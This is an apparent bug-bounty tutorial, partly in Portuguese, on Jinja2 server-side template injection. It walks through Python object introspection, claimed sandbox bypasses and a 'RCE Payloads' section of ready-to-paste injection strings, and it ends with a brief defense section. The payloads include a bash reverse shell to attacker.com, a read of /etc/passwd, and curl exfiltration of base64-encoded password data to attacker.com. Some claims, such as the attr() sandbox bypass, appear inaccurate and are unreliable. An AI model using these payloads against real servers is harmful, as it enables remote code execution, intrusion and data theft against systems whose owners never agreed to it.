# Jinja2 Server-Side Template Injection (SSTI)

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $3,000 - $20,000 USD

---

## 📚 Índice

1. [Jinja2 Architecture](#jinja2-architecture)
2. [Template Compilation Process](#template-compilation-process)
3. [Python Object Model Exploitation](#python-object-model-exploitation)
4. [Method Resolution Order (MRO)](#method-resolution-order-mro)
5. [Sandbox Escape Techniques](#sandbox-escape-techniques)
6. [RCE Payloads](#rce-payloads)
7. [Real-World Cases](#real-world-cases)

---

## 🏗️ Jinja2 Architecture

### O Que É Jinja2?

Jinja2 é template engine para Python, usado principalmente com **Flask** e **Django**.

**Normal usage (SAFE):**

```python
from jinja2 import Template

template = Template("Hello {{ name }}!")
output = template.render(name="Alice")
# Output: "Hello Alice!"
```

**Vulnerable usage:**

```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # ❌ VULNERÁVEL: User input direto no template!
    template = Template(f"Hello {{ {name} }}!")
    return template.render()

# Exploit: ?name={{7*7}}
# Output: "Hello 49!"  ← Code executed!
```

### Jinja2 Syntax

**Variables:** `{{ variable }}`
**Statements:** `{% statement %}`
**Comments:** `{# comment #}`

**Filters:**
```jinja2
{{ variable|filter }}
{{ "hello"|upper }}  → "HELLO"
{{ [1,2,3]|length }} → 3
```

**Tests:**
```jinja2
{% if variable is defined %}...{% endif %}
{% if 42 is even %}...{% endif %}
```

---

## ⚙️ Template Compilation Process

### Phase 1: Lexical Analysis (Tokenization)

```python
# Input
"Hello {{ name }}!"

# Tokens
[
    ('data', 'Hello '),
    ('variable_begin', '{{'),
    ('name', 'name'),
    ('variable_end', '}}'),
    ('data', '!')
]
```

**Lexer source (simplified from Jinja2):**

```python
# jinja2/lexer.py
class Lexer:
    def tokenize(self, source):
        for match in self.rules.finditer(source):
            token_type = match.lastgroup
            value = match.group(token_type)

            if token_type == 'variable_begin':
                yield Token('variable_begin', value)
            elif token_type == 'data':
                yield Token('data', value)
            # ...
```

### Phase 2: Parsing (AST Construction)

```python
# AST (Abstract Syntax Tree)
Template(
    body=[
        Output([
            TemplateData('Hello '),
            Name('name'),  # ← Variable lookup
            TemplateData('!')
        ])
    ]
)
```

### Phase 3: Code Generation

Jinja2 compila template para **Python bytecode**!

```python
# Generated Python code (conceptual)
def template_render(context):
    output = []
    output.append('Hello ')
    output.append(str(context['name']))  # ← Variable access
    output.append('!')
    return ''.join(output)
```

### Phase 4: Execution

```python
# Runtime execution
context = {'name': 'Alice'}
result = template_render(context)
# "Hello Alice!"
```

**CRITICAL:** Se input malicioso está no template, é compilado como código Python!

```python
# Malicious input
"{{ 7*7 }}"

# Compiled to
output.append(str(7*7))  # ← Executa multiplicação!
```

---

## 🐍 Python Object Model Exploitation

### Everything is an Object

Em Python, **tudo é objeto** - incluindo classes, funções, módulos.

```python
>>> type(42)
<class 'int'>

>>> type(int)
<class 'type'>

>>> type(type)
<class 'type'>  # type é instância de si mesmo!
```

### Object Introspection

Python permite **introspecção completa** de objetos em runtime:

**Attributes:**
```python
>>> ''.__class__
<class 'str'>

>>> ''.__class__.__bases__
(<class 'object'>,)

>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
```

**Subclasses:**
```python
>>> object.__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ...]
# Lista TODAS as classes no Python runtime!
```

### Finding Useful Classes

**Goal:** Encontrar classe com acesso a `os.system()` ou similar

```python
# Enumerate all subclasses
for i, cls in enumerate(object.__subclasses__()):
    print(f"{i}: {cls.__name__}")

# Output (truncated):
# 0: type
# 1: weakref
# ...
# 104: WarningMessage
# 105: catch_warnings  ← Útil!
# ...
# 245: Popen  ← subprocess.Popen!
```

**Access via template:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

---

## 🔍 Method Resolution Order (MRO)

### O Que É MRO?

MRO define a ordem de busca de atributos em herança múltipla.

**Example:**

```python
class A:
    def method(self):
        return 'A'

class B(A):
    pass

class C(A):
    def method(self):
        return 'C'

class D(B, C):
    pass

>>> D.mro()
[<class 'D'>, <class 'B'>, <class 'C'>, <class 'A'>, <class 'object'>]
```

**C3 Linearization Algorithm:**

```
L(D) = D + merge(L(B), L(C), [B, C])
     = D + merge([B, A, object], [C, A, object], [B, C])
     = [D, B, C, A, object]
```

### Exploiting MRO for SSTI

**Goal:** Alcançar `object` class (root de todas as classes)

```jinja2
{{ ''.__class__ }}
→ <class 'str'>

{{ ''.__class__.__mro__ }}
→ (<class 'str'>, <class 'object'>)

{{ ''.__class__.__mro__[1] }}
→ <class 'object'>

{{ ''.__class__.__mro__[1].__subclasses__() }}
→ [<class 'type'>, <class 'weakref'>, ..., <class 'Popen'>, ...]
```

**Why this works:**
- `''` é string vazia (sempre disponível em Jinja2)
- `.__class__` retorna `str` class
- `.__mro__[1]` retorna `object` (base de tudo)
- `.__subclasses__()` lista TODAS as classes
- Encontramos `Popen`, `WarningMessage`, etc. com capacidades perigosas

---

## 🚀 Sandbox Escape Techniques

### Jinja2 Sandbox

Jinja2 tem modo "sandbox" que teoricamente bloqueia código perigoso:

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("{{ ''.__class__ }}")
template.render()
# SecurityError: access to attribute '__class__' is unsafe
```

**Blocked attributes:**
- `__class__`
- `__mro__`
- `__subclasses__`
- `__globals__`
- `__builtins__`

### Bypass 1: attr() Filter

```jinja2
# Blocked
{{ ''.__class__ }}

# Bypass usando |attr()
{{ ''|attr('__class__') }}
```

**Why it works:**

```python
# jinja2/filters.py
def do_attr(obj, name):
    return getattr(obj, name)  # ← Não checa blacklist!
```

### Bypass 2: [] (Item Access)

```jinja2
# Blocked
{{ ''.__class__ }}

# Bypass
{{ ''['__class__'] }}
```

### Bypass 3: Request Object

Flask expõe `request` object globalmente:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').system('id') }}
```

**Breakdown:**

```python
request.application         # Flask app object
  .__globals__             # Global namespace
    .__builtins__          # Built-in functions
      .__import__('os')    # Import os module
        .system('id')      # Execute command
```

### Bypass 4: Lipsum/Cycler Globals

Jinja2 fornece globals como `lipsum` e `cycler`:

```jinja2
{{ lipsum.__globals__ }}
{{ cycler.__init__.__globals__ }}
```

**Exploitation:**

```jinja2
{{ lipsum.__globals__['os'].popen('whoami').read() }}
```

---

## 💣 RCE Payloads

### Payload 1: Via __subclasses__()

**Find subprocess.Popen:**

```python
# Enumerar classes
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'Popen' %}
    Index: {{ i }}
  {% endif %}
{% endfor %}
```

**Exploit (supondo índice 245):**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[245]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}
```

### Payload 2: Via warnings.catch_warnings

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

**Breakdown:**
```python
''.__class__.__mro__[1].__subclasses__()[104]  # warnings.catch_warnings
  .__init__                                    # __init__ method
    .__globals__                               # Global namespace
      ['sys']                                  # sys module
        .modules['os']                         # os module
          .popen('id')                         # Execute command
            .read()                            # Read output
```

### Payload 3: Via config Object (Flask)

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

### Payload 4: Via lipsum

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
```

### Payload 5: Via cycler

```jinja2
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
```

### Payload 6: Reverse Shell

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"').read() }}
```

### Payload 7: File Read

```jinja2
{{ config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
```

### Payload 8: Exfiltration via HTTP

```jinja2
{{ lipsum.__globals__['os'].popen('curl http://attacker.com/?data=$(cat /etc/passwd | base64)').read() }}
```

---

## 🔥 Real-World Cases

### Case 1: Uber Flask SSTI (2016)

**Vulnerability:** Error page template injection

**Payload:**
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

**Impact:** Full server compromise, access to internal APIs

**Bounty:** $10,000 USD

### Case 2: Shopify SSTI via Liquid (2019)

**Vulnerability:** Liquid template (Ruby equivalent of Jinja2)

**Payload:**
```liquid
{{ self }}
{{ self.class.superclass.superclass }}
```

**Impact:** RCE on Shopify infrastructure

**Bounty:** $25,000 USD

### Case 3: Airbnb SSTI (2017)

**Vulnerability:** Custom template engine with Jinja2-like syntax

**Payload:**
```jinja2
{{request.application.__globals__.__builtins__.__import__('os').system('whoami')}}
```

**Impact:** Access to booking data

**Bounty:** $7,000 USD

---

## 🛡️ Defense

### 1. Never Use User Input in Templates

```python
# ❌ VULNERÁVEL
template = Template(f"Hello {{{user_input}}}!")

# ✅ SEGURO
template = Template("Hello {{ name }}!")
output = template.render(name=user_input)
```

### 2. Use Sandboxed Environment

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("{{ name }}")
```

### 3. Whitelist Allowed Variables

```python
allowed_vars = {'name', 'email', 'age'}

def safe_render(template_str, user_vars):
    safe_vars = {k: v for k, v in user_vars.items() if k in allowed_vars}
    template = Template(template_str)
    return template.render(**safe_vars)
```

---

**Última atualização**: 2024
**Versão**: 1.0
